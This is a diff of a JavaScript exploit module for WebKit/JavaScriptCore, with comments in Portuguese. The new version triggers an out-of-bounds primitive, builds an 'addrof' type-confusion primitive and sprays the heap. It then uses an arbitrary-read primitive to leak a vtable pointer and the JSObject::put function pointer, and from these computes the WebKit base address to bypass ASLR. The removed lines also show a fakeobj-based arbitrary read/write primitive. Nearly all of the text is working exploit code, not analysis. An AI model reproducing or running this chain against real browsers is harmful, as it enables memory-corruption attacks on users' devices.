@@ -1,31 +1,24 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v103 - R63 Final com Utils Corrigido)
+// js/script3/testArrayBufferVictimCrash.mjs (v104 - R64 - Estratégia Final e Direta)
 // =======================================================================================
 // ESTRATÉGIA ATUALIZADA:
-// Utiliza uma função 'sub' corrigida em utils.mjs e adiciona verificações de sanidade
-// nos ponteiros lidos para garantir que a cadeia de exploração não falhe devido a
-// valores de memória inesperados. Esta deve ser a versão definitiva.
+// Abandona as primitivas addrof/fakeobj instáveis para leitura/escrita.
+// Utiliza a primitiva arb_read confiável do core_exploit.mjs, que manipula
+// diretamente os metadados de um DataView, para realizar o vazamento do endereço base.
+// Esta abordagem é mais direta e elimina a fonte de instabilidade anterior.
 // =======================================================================================
 
 import { logS3 } from './s3_utils.mjs';
 import { AdvancedInt64 } from '../utils.mjs';
 import {
     triggerOOB_primitive,
-    getOOBDataView
+    arb_read, // Importa a primitiva de leitura direta e confiável
 } from '../core_exploit.mjs';
 import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';
 
-export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_WebKitLeak_v103_R63_FINAL";
+export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_DirectLeak_v104_R64_FINAL";
 
 // --- Funções de Conversão (Double <-> Int64) ---
-function int64ToDouble(int64) {
-    const buf = new ArrayBuffer(8);
-    const u32 = new Uint32Array(buf);
-    const f64 = new Float64Array(buf);
-    u32[0] = int64.low();
-    u32[1] = int64.high();
-    return f64[0];
-}
-
+// Apenas doubleToInt64 é necessário para a primitiva addrof inicial.
 function doubleToInt64(double) {
     const buf = new ArrayBuffer(8);
     (new Float64Array(buf))[0] = double;
@@ -34,11 +27,11 @@ function doubleToInt64(double) {
 }
 
 // =======================================================================================
-// FUNÇÃO ORQUESTRADORA PRINCIPAL (IMPLEMENTAÇÃO FINAL COM VERIFICAÇÃO E LEAK)
+// FUNÇÃO ORQUESTRADORA PRINCIPAL (USANDO ESTRATÉGIA DIRETA)
 // =======================================================================================
 export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
     const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
-    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Implementação com Vazamento de Base WebKit ---`, "test");
+    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Estratégia de Leitura Direta ---`, "test");
 
     let final_result = { 
         success: false, 
@@ -47,40 +40,21 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
     };
 
     try {
-        // --- FASE 1 & 2: Obter OOB e primitivas addrof/fakeobj ---
-        logS3("--- FASE 1/2: Obtendo primitivas OOB e addrof/fakeobj... ---", "subtest");
+        // --- FASE 1: Obter OOB e a primitiva addrof inicial ---
+        logS3("--- FASE 1: Obtendo OOB e 'addrof' inicial... ---", "subtest");
         await triggerOOB_primitive({ force_reinit: true });
-        if (!getOOBDataView()) throw new Error("Falha ao obter primitiva OOB.");
 
+        // A primitiva addrof ainda é útil para obter um endereço inicial
         const confused_array = [13.37];
         const victim_array = [{ a: 1 }];
         const addrof = (obj) => {
             victim_array[0] = obj;
             return doubleToInt64(confused_array[0]);
         };
-        const fakeobj = (addr) => {
-            confused_array[0] = int64ToDouble(addr);
-            return victim_array[0];
-        };
-        logS3("Primitivas 'addrof' e 'fakeobj' operacionais.", "good");
+        logS3("Primitiva 'addrof' inicial operacional.", "good");
 
-        // --- FASE 3: Construção da Primitiva de L/E Autocontida ---
-        logS3("--- FASE 3: Construindo ferramenta de L/E autocontida ---", "subtest");
-        const leaker = { obj_prop: null, val_prop: 0 };
-        
-        const arb_read_final = (addr) => {
-            leaker.obj_prop = fakeobj(addr);
-            return doubleToInt64(leaker.val_prop);
-        };
-        const arb_write_final = (addr, value) => {
-            leaker.obj_prop = fakeobj(addr);
-            leaker.val_prop = int64ToDouble(value);
-        };
-        logS3("Primitivas de Leitura/Escrita Arbitrária autocontidas estão prontas.", "good");
-
-        // --- FASE 4: Estabilização de Heap e Verificação Funcional de L/E ---
-        logS3("--- FASE 4: Estabilizando Heap e Verificando L/E... ---", "subtest");
-        
+        // --- FASE 2: Estabilização de Heap ---
+        logS3("--- FASE 2: Estabilizando Heap... ---", "subtest");
         const spray = [];
         for (let i = 0; i < 1000; i++) {
             spray.push({ a: 0xDEADBEEF, b: 0xCAFEBABE });
@@ -88,60 +62,41 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         const test_obj = spray[500];
         logS3("Spray de 1000 objetos concluído para estabilização.", "info");
 
+        // --- FASE 3: Vazamento de Endereço Base com Leitura Direta ---
+        logS3("--- FASE 3: Vazando Endereço Base com Leitura Direta (arb_read)... ---", "subtest");
+            
         const test_obj_addr = addrof(test_obj);
-        const value_to_write = new AdvancedInt64(0x12345678, 0xABCDEF01);
-        const rw_test_target_addr = test_obj_addr;
-        
-        logS3(`Escrevendo ${value_to_write.toString(true)} no endereço alvo ${rw_test_target_addr.toString(true)} (que atuará em +0x10)...`, "info");
-        arb_write_final(rw_test_target_addr, value_to_write);
-
-        const value_read = arb_read_final(rw_test_target_addr);
-        logS3(`>>>>> VALOR LIDO DE VOLTA: ${value_read.toString(true)} <<<<<`, "leak");
-
-        if (value_read.equals(value_to_write)) {
-            logS3("++++++++++++ SUCESSO! O valor escrito foi lido corretamente. L/E arbitrária é 100% funcional. ++++++++++++", "vuln");
+        logS3(`Endereço do objeto de teste obtido via addrof: ${test_obj_addr.toString(true)}`, "info");
             
-            // --- FASE 5: Vazamento do Endereço Base do WebKit ---
-            logS3("--- FASE 5: Vazando Endereço Base do WebKit... ---", "subtest");
-            
-            // Compensa o offset implícito de +0x10 para ler a V-Table (que está no offset 0x0 do objeto)
-            const addr_to_read_vtable = test_obj_addr.sub(0x10);
-            const vtable_addr = arb_read_final(addr_to_read_vtable);
-            logS3(`Lido ponteiro da V-Table de ${test_obj_addr.toString(true)} -> ${vtable_addr.toString(true)}`, "info");
+        // Usa a primitiva arb_read confiável para ler o ponteiro da V-Table no offset 0x0 do objeto.
+        const vtable_addr = await arb_read(test_obj_addr, 8);
+        logS3(`Lido ponteiro da V-Table de ${test_obj_addr.toString(true)} -> ${vtable_addr.toString(true)}`, "leak");
 
-            // Verificação de sanidade no ponteiro lido
-            if (!vtable_addr || vtable_addr.high() === 0) {
-                throw new Error(`Ponteiro da V-Table lido (${vtable_addr.toString(true)}) parece inválido.`);
-            }
-
-            const VIRTUAL_PUT_OFFSET_IN_VTABLE = new AdvancedInt64(JSC_OFFSETS.Structure.VIRTUAL_PUT_OFFSET);
-            const put_func_ptr_addr = vtable_addr.add(VIRTUAL_PUT_OFFSET_IN_VTABLE);
-            
-            // Lê o endereço da função 'put', compensando o offset da primitiva de leitura
-            const put_func_addr = arb_read_final(put_func_ptr_addr.sub(0x10));
-            logS3(`Lido ponteiro da função put() da V-Table -> ${put_func_addr.toString(true)}`, "info");
-            
-            if (!put_func_addr || put_func_addr.high() === 0) {
-                throw new Error(`Ponteiro da função put() lido (${put_func_addr.toString(true)}) parece inválido.`);
-            }
-
-            const PUT_FUNC_STATIC_OFFSET = new AdvancedInt64(WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS["JSC::JSObject::put"]);
-            const webkit_base_addr = put_func_addr.sub(PUT_FUNC_STATIC_OFFSET);
-
-            logS3(`>>>>>>>>>> ENDEREÇO BASE DO WEBKIT VAZADO: ${webkit_base_addr.toString(true)} <<<<<<<<<<`, "vuln");
-            
-            final_result = {
-                success: true,
-                message: "Leitura/Escrita verificada e endereço base do WebKit vazado com sucesso.",
-                webkit_base_address: webkit_base_addr.toString(true)
-            };
-
-        } else {
-            // Se a verificação falhar, restaura o valor original para não corromper o estado
-            const original_vtable = arb_read_final(test_obj_addr.sub(0x10));
-            arb_write_final(test_obj_addr, original_vtable);
-            throw new Error(`A verificação de L/E falhou. Escrito: ${value_to_write.toString(true)}, Lido: ${value_read.toString(true)}`);
+        if (!vtable_addr || vtable_addr.high() === 0) {
+            throw new Error(`Ponteiro da V-Table lido (${vtable_addr.toString(true)}) parece inválido.`);
         }
+
+        const VIRTUAL_PUT_OFFSET_IN_VTABLE = new AdvancedInt64(JSC_OFFSETS.Structure.VIRTUAL_PUT_OFFSET);
+        const put_func_ptr_addr = vtable_addr.add(VIRTUAL_PUT_OFFSET_IN_VTABLE);
+            
+        // Lê o endereço da função 'put' da V-Table usando arb_read.
+        const put_func_addr = await arb_read(put_func_ptr_addr, 8);
+        logS3(`Lido ponteiro da função put() de ${put_func_ptr_addr.toString(true)} -> ${put_func_addr.toString(true)}`, "leak");
+            
+        if (!put_func_addr || put_func_addr.high() === 0) {
+            throw new Error(`Ponteiro da função put() lido (${put_func_addr.toString(true)}) parece inválido.`);
+        }
+
+        const PUT_FUNC_STATIC_OFFSET = new AdvancedInt64(WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS["JSC::JSObject::put"]);
+        const webkit_base_addr = put_func_addr.sub(PUT_FUNC_STATIC_OFFSET);
+
+        logS3(`>>>>>>>>>> ENDEREÇO BASE DO WEBKIT VAZADO: ${webkit_base_addr.toString(true)} <<<<<<<<<<`, "vuln");
+            
+        final_result = {
+            success: true,
+            message: "Endereço base do WebKit vazado com sucesso usando a primitiva de leitura direta.",
+            webkit_base_address: webkit_base_addr.toString(true)
+        };
 
     } catch (e) {
         final_result.message = `Exceção na implementação funcional: ${e.message}\n${e.stack || ''}`;
@@ -152,14 +107,14 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
     
     return {
         errorOccurred: final_result.success ? null : final_result.message,
-        addrof_result: { success: final_result.success, msg: "Primitiva addrof funcional." },
+        addrof_result: { success: final_result.success, msg: "Primitiva addrof inicial funcional." },
         webkit_leak_result: { 
             success: final_result.success, 
             msg: final_result.message,
             webkit_base_candidate: final_result.webkit_base_address
         },
         heisenbug_on_M2_in_best_result: final_result.success,
-        oob_value_of_best_result: 'N/A (Estratégia Uncaged)',
-        tc_probe_details: { strategy: 'Uncaged Self-Contained R/W (Verified + WebKit Leak)' }
+        oob_value_of_best_result: 'N/A (Estratégia de Leitura Direta)',
+        tc_probe_details: { strategy: 'Uncaged Direct R/W Strategy' }
     };
 }
